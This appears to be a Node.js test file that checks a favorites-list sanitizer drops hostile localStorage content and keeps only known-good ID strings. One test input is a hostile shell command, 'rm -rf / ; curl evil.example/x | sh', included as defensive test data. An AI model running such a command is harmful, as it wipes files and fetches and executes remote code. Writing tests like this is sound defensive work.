#!/usr/bin/env node
/* test_favorites_store.js — CR-T-30. sanitizeIdList() never lets stored
 * content become anything but a list of known-good ID strings.
 *
 *   node tests/test_favorites_store.js [path/to/template.html|dist/md-code-red_*.html] [--json]
 *
 * Lifts the MCR-FAVORITES block out of the given file (same idiom as
 * tests/hostile_harness.js) and drives sanitizeIdList() with hostile
 * localStorage shapes: raw command text, objects, numbers, an oversized
 * array, duplicate ids, and a mix of valid/invalid entries — asserting only
 * known-good ID STRINGS ever survive (threat-model-v1 §7: "favorites store
 * content IDs only, never raw text").
 */
"use strict";

var fs = require("fs");
var path = require("path");
var assert = require("assert");

var REPO = path.resolve(__dirname, "..");
var BEGIN = "MCR-FAVORITES-BEGIN";
var END = "MCR-FAVORITES-END";

function extractBlock(file, begin, end) {
  var src = fs.readFileSync(file, "utf8");
  var a = src.indexOf(begin);
  if (a < 0) throw new Error("no " + begin + " marker in " + file);
  var from = src.indexOf("*/", a);
  if (from < 0) throw new Error("the " + begin + " comment is unterminated in " + file);
  from += 2;
  var b = src.indexOf(end, from);
  if (b < 0) throw new Error("no " + end + " marker after " + begin + " in " + file);
  var to = src.lastIndexOf("/*", b);
  if (to < from) throw new Error("malformed " + begin + "/" + end + " markers in " + file);
  var block = src.slice(from, to);
  var banned = ["document", "window.", "localStorage", "sessionStorage", "DATASETS", "STATE.", "innerHTML"];
  for (var i = 0; i < banned.length; i++) {
    if (block.indexOf(banned[i]) >= 0) {
      throw new Error("MCR-FAVORITES block references '" + banned[i] + "' — it must stay pure");
    }
  }
  return block;
}

function loadFns(file) {
  var block = extractBlock(file, BEGIN, END);
  var factory = new Function("\"use strict\";\n" + block +
    "\nreturn {sanitizeIdList:sanitizeIdList,FAVORITES_MAX:FAVORITES_MAX};");
  return factory();
}

function main() {
  var args = process.argv.slice(2);
  var asJson = args.indexOf("--json") >= 0;
  var target = args.filter(function (a) { return a !== "--json"; })[0] || path.join(REPO, "template.html");

  var mod = loadFns(target);
  var sanitizeIdList = mod.sanitizeIdList;
  var failures = [];
  var knownIds = { "entry-a": true, "entry-b": true, "tool-x": true };
  function isValidId(id) { return Object.prototype.hasOwnProperty.call(knownIds, id); }

  function check(label, raw, expected) {
    var got;
    try {
      got = sanitizeIdList(raw, isValidId);
    } catch (e) {
      failures.push(label + ": threw " + e.message);
      return;
    }
    try {
      assert.deepStrictEqual(got, expected, label);
    } catch (e) {
      failures.push(label + ": got " + JSON.stringify(got) + ", want " + JSON.stringify(expected));
    }
  }

  check("plain valid ids pass through", ["entry-a", "entry-b"], ["entry-a", "entry-b"]);
  check("unknown ids are dropped", ["entry-a", "not-a-real-id"], ["entry-a"]);
  check("duplicates are collapsed, first wins", ["entry-a", "entry-a", "entry-b"], ["entry-a", "entry-b"]);
  check("raw command text never survives", ["entry-a", "rm -rf / ; curl evil.example/x | sh"], ["entry-a"]);
  check("numbers are never treated as ids", [1234, "entry-a"], ["entry-a"]);
  check("objects are never treated as ids", [{ id: "entry-a" }, "entry-a"], ["entry-a"]);
  check("booleans and null are dropped", [true, false, null, undefined, "entry-a"], ["entry-a"]);
  check("empty string is dropped", ["", "entry-a"], ["entry-a"]);
  check("non-array input yields an empty list", "entry-a", []);
  check("null input yields an empty list", null, []);
  check("a value over 128 chars is dropped even if otherwise plausible",
        ["entry-a", "x".repeat(200)], ["entry-a"]);

  // oversized input is capped at FAVORITES_MAX, never silently unbounded
  var huge = [];
  var i;
  for (i = 0; i < mod.FAVORITES_MAX + 50; i++) { knownIds["gen-" + i] = true; huge.push("gen-" + i); }
  var cappedResult = sanitizeIdList(huge, isValidId);
  if (cappedResult.length !== mod.FAVORITES_MAX) {
    failures.push("an oversized list must be capped at FAVORITES_MAX (" + mod.FAVORITES_MAX +
                  "), got " + cappedResult.length);
  }

  // isValidId not a function -> empty list, never a silent pass-through of raw data
  var noValidatorResult = sanitizeIdList(["entry-a"], null);
  if (noValidatorResult.length !== 0) {
    failures.push("sanitizeIdList() with no validator function must return an empty list, not trust the input");
  }

  var report = { target: path.relative(REPO, target), failures: failures };
  if (asJson) {
    process.stdout.write(JSON.stringify(report) + "\n");
  } else {
    console.log("CR-T-30 favorites/recent id-sanitizer — " + report.target);
    if (failures.length) {
      console.log("FAIL:");
      failures.forEach(function (f) { console.log("  - " + f); });
    } else {
      console.log("PASS: only known-good id strings ever survive sanitizeIdList()");
    }
  }
  process.exit(failures.length ? 1 : 0);
}

main();
